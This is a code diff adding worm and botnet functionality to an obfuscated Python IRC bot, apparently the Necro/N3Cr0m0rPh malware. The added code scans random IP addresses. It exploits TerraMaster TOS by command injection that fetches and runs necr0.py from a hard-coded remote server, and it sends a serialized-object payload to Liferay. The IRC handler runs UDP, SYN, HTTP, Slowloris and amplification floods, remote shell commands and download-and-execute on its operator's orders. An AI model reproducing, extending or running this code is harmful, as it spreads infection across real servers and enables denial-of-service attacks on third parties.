@@ -657,3 +657,193 @@ class SOoOJjHc():
         except:
             pass
 
+
+    def check_endpoint(self, url):
+        response = urllib.urlopen(url+'/version')
+        if response.getcode() == 200:
+            print(("[+] TerraMaster TOS version: ", str(response.content)))
+            return 1
+        else:
+            #print(("\n[-] TerraMaster TOS response code: ", response.status_code))
+            return 0
+    def exploit(self, ip, port):
+        if "443" in str(port):
+            url = "https://"+ip+":"+str(port)
+        else:
+            url = "http://"+ip+":"+str(port)
+        try:
+            if self.check_endpoint(url):
+                urllib2.urlopen(url+'/include/makecvs.php?Event=%60cd%20%2Ftmp%7C%7Ccd%20%24%28find%20%2F%20-writable%20%7C%20head%20-n%201%29%3Bcurl%20http%3A%2F%2F45.145.185.229%2Fnecr0.py%3Enecr0.py%3B%20php%20-r%20%22file_put_contents%28%5C%22necr0.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F45.145.185.229%2Fnecr0.py%5C%22%29%29%3B%22%3B%20wget%20http%3A%2F%2F45.145.185.229%2Fnecr0.py%20-O%20necr0.py%3B%20chmod%20777%20necr0.py%3B%20.%2Fnecr0.py%20%7C%7C%20python%20necr0.py%7C%7Cpython2%20necr0.py%20%26%60')
+            else:
+                data = {
+                    'columnId': '1',
+                    'name': '2',
+                    'type': '3',
+                    '+defaultData': 'com.mchange.v2.c3p0.WrapperConnectionPoolDataSource',
+                    'defaultData.userOverridesAsString': 'HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a65637474001a687474703a2f2f34352e3134352e3138352e38333a383030342f740003466f6f;'
+                }
+                req = urllib2.Request(url+"/api/jsonws/expandocolumn/update-column", json.dumps(data), {'Content-Type': 'application/json', 'Authorization' : 'Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0'})
+                urllib2.urlopen(req)
+        except Exception as e:
+            print str(e)
+    def gen_IP(self):
+        not_valid = [10,127,169,172,192,185,233,234]
+        first = random.randrange(1,256)
+        while first in not_valid:
+            first = random.randrange(1,256)
+        ip = ".".join([str(first),str(random.randrange(1,256)),
+        str(random.randrange(1,256)),str(random.randrange(1,256))])
+        return ip
+    def worker(self):
+        while True:
+            IP = self.gen_IP()
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((IP, 80))
+                s.close()
+                self.exploit(IP, 80)
+            except Exception as e:
+                pass
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((IP, 8443))
+                s.close()
+                self.exploit(IP, 8443)
+            except Exception as e:
+                pass
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((IP, 443))
+                s.close()
+                self.exploit(IP, 443)
+            except Exception as e:
+                pass
+    def uZDtNcSo(self):
+        YMXAcFNC=""
+        self.wdVpXFAu=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.wdVpXFAu.connect((self.TdFAsxPn, self.yAtAtBpQ))
+        wJwiwMvF = 0
+        self.wdVpXFAu.send("NICK %s\n" % self.DQTonzOr)
+        self.wdVpXFAu.send("USER %s %s localhost :%s\n" % (self.iZZsSIWY, self.TdFAsxPn, self.rantDwWe))
+        gaKE = 1
+        while 1:
+            YMXAcFNC=YMXAcFNC+self.wdVpXFAu.recv(1024)
+            wIjtipUi=split(YMXAcFNC, "\n")
+            YMXAcFNC=wIjtipUi.pop( )
+            for self.eaxbPqQN in wIjtipUi:
+                self.eaxbPqQN=rstrip(self.eaxbPqQN)
+                self.eaxbPqQN=split(self.eaxbPqQN)
+                if(self.eaxbPqQN[0]=="PING"):
+                    self.wdVpXFAu.send("PONG %s\n" % self.eaxbPqQN[1])
+                elif(self.eaxbPqQN[1]=="376" or self.eaxbPqQN[1]=="422" or self.eaxbPqQN[1]=="352"):
+                    if wJwiwMvF == 0:
+                        self.wdVpXFAu.send("JOIN %s %s\n" % (self.PtOPRyaP,self.JLLtTniF))
+                        wJwiwMvF = 1
+                elif(self.eaxbPqQN[1]=="433"):
+                    self.DQTonzOr="[N3Cr0m0rPh]"+str(self.AcowFUYn)
+                    self.wdVpXFAu.send("NICK %s\n" % self.DQTonzOr)
+            try:
+                if self.eaxbPqQN[3]==":ddos.udpflood":
+                    self.wdVpXFAu.send("PRIVMSG %s :Started UDP flood on %s:%s\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[5]))
+                    threading.Thread(target=self.FnbHBIKX,args=(self.eaxbPqQN[4],int(self.eaxbPqQN[5]),int(self.eaxbPqQN[6]),)).start()
+                elif self.eaxbPqQN[3]==":ddos.synflood":
+                    self.wdVpXFAu.send("PRIVMSG %s :Started SYN flood on %s:%s with %s threads\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[5],self.eaxbPqQN[7]))
+                    for i in range(0, int(self.eaxbPqQN[7])):
+                        threading.Thread(target=self.UYUHvuMj,args=(self.eaxbPqQN[4],int(self.eaxbPqQN[5]),int(self.eaxbPqQN[6],))).start()
+                elif self.eaxbPqQN[3]==":ddos.slowloris":
+                    self.wdVpXFAu.send("PRIVMSG %s :Started Slowloris on %s with %s sockets\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[5]))
+                    threading.Thread(target=self.bvuPxxoe,args=(self.eaxbPqQN[4],int(self.eaxbPqQN[5]),int(self.eaxbPqQN[6],))).start()
+                elif self.eaxbPqQN[3]==":ddos.httpflood":
+                    self.wdVpXFAu.send("PRIVMSG %s :Started HTTP flood on URL: %s with %s threads\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[7]))
+                    for i in range(0, int(self.eaxbPqQN[7])):
+                        threading.Thread(target=self.szpMLewu,args=(self.eaxbPqQN[4],int(self.eaxbPqQN[5]),self.eaxbPqQN[6],)).start()
+                elif self.eaxbPqQN[3]==":ddos.loadamp":
+                    self.wdVpXFAu.send("PRIVMSG %s :Downloading %s list from %s\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[5]))
+                    urllib.urlretrieve(self.eaxbPqQN[5], "."+self.eaxbPqQN[4])
+                elif self.eaxbPqQN[3]==":ddos.amp":
+                    try:
+                        if not os.path.exists("."+self.eaxbPqQN[4]):
+                            self.wdVpXFAu.send("PRIVMSG %s :Please load this type of amp list first.\n" % (self.PtOPRyaP))
+                            continue
+                        domains="netflix.com,youtube.com,facebook.com,google.com,yahoo.com".split(",")
+                        proto = self.eaxbPqQN[4]
+                        if self.eaxbPqQN[4] == "dns":
+                            try:
+                                domains = self.eaxbPqQN[8].split(",")
+                            except:
+                                pass
+                        files[self.eaxbPqQN[4]] = ["."+self.eaxbPqQN[4]]
+                        self.wdVpXFAu.send("PRIVMSG %s :Started %s amp flood on %s\n" % (self.PtOPRyaP,self.eaxbPqQN[4],self.eaxbPqQN[5]))
+                        self.DDoS(socket.gethostbyname(self.eaxbPqQN[5]), int(self.eaxbPqQN[6]), domains, int(self.eaxbPqQN[7]))
+                    except Exception as e:
+                        print(str(e))
+                elif self.eaxbPqQN[3]==":bot.scannetrange":
+                    threading.Thread(target=self.PBsHzYzW,args=(self.eaxbPqQN[4],self.eaxbPqQN[5],self.eaxbPqQN[6],)).start()
+                elif self.eaxbPqQN[3]==":bot.shell":
+                    try:
+                            lCanVoaL = subprocess.Popen(self.eaxbPqQN[4:],stdout=subprocess.PIPE)
+                            for KxzLcvJg in iter(lCanVoaL.stdout.readline,''):
+                                    self.wdVpXFAu.send("PRIVMSG %s :%s\n" % (self.PtOPRyaP,KxzLcvJg))
+                    except:
+                            self.wdVpXFAu.send("PRIVMSG %s :Failed to execute command.\n" % self.PtOPRyaP)
+                elif self.eaxbPqQN[3]==":bot.repack":
+                    self.dFlmiDcL()
+                    self.wdVpXFAu.send("PRIVMSG %s :Repacked code!\n" % (self.PtOPRyaP))
+
+                elif self.eaxbPqQN[3]==":http.download":
+                    try:
+                        urllib.urlretrieve(self.eaxbPqQN[4],self.eaxbPqQN[5])
+                        self.wdVpXFAu.send("PRIVMSG %s :Downloaded.\n" % (self.PtOPRyaP))
+                    except:
+                        self.wdVpXFAu.send("PRIVMSG %s :Could not download!\n" % (self.PtOPRyaP))
+                elif self.eaxbPqQN[3]==":http.execute":
+                    try:
+                        urllib.urlretrieve(self.eaxbPqQN[4],self.eaxbPqQN[5])
+                        if not platform.System.startswith("Windows"):
+                            try:
+                                os.chmod(self.eaxbPqQN[5], 0777)
+                            except:
+                                pass
+                        subprocess.Popen([("%s" % self.eaxbPqQN[5])])
+                        self.wdVpXFAu.send("PRIVMSG %s :Downloaded and executed.\n" % (self.PtOPRyaP))
+                    except:
+                        self.wdVpXFAu.send("PRIVMSG %s :Could not download or execute!\n" % (self.PtOPRyaP))
+                elif self.eaxbPqQN[3]==":bot.reset":
+                    self.RPjPiRqo()
+                elif self.eaxbPqQN[3]==":bot.move":
+                    self.TdFAsxPn=self.eaxbPqQN[4] #Server
+                    self.PtOPRyaP=self.eaxbPqQN[5] #Channel
+                    self.JLLtTniF=self.eaxbPqQN[6] #Channel key
+                    while 1:
+                        try:
+                            self.RPjPiRqo()
+                        except:
+                            pass
+                elif self.eaxbPqQN[3]==":bot.killbyname":
+                    os.popen("pkill -f %s" % self.eaxbPqQN[4])
+                    self.wdVpXFAu.send("PRIVMSG %s :Killed.\n" % (self.PtOPRyaP))
+                elif self.eaxbPqQN[3]==":bot.killbypid":
+                    os.kill(int(self.eaxbPqQN[4]),9)
+                    self.wdVpXFAu.send("PRIVMSG %s :Killed.\n" % (self.PtOPRyaP))
+                elif self.eaxbPqQN[3]==":threads.end":
+                    self.AELmEnMe=1
+                elif self.eaxbPqQN[3]==":threads.begin":
+                    self.AELmEnMe=0
+                elif self.eaxbPqQN[3]==":sniff.start":
+                    pause=0
+                elif self.eaxbPqQN[3]==":sniff.pause":
+                    pause=1
+                elif self.eaxbPqQN[3]==":bot.getip":
+                    self.wdVpXFAu.send("PRIVMSG %s :%s\n" % (self.PtOPRyaP,urllib2.urlopen("https://api.ipify.org").read()))
+                elif self.eaxbPqQN[3]==":bot.ram":
+                    meminfo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open('/proc/meminfo').readlines())
+                    mem_kib = meminfo['MemTotal']  # e.g. 3921852
+                    self.wdVpXFAu.send("PRIVMSG %s :%s MB RAM total.\n" % (self.PtOPRyaP, mem_kib / 1024))
+                elif self.eaxbPqQN[3]==":bot.killmyeyepeeusinghoic":
+                   os.kill(os.getpid(),9)
+            except IndexError or TypeError:
+                pass
+
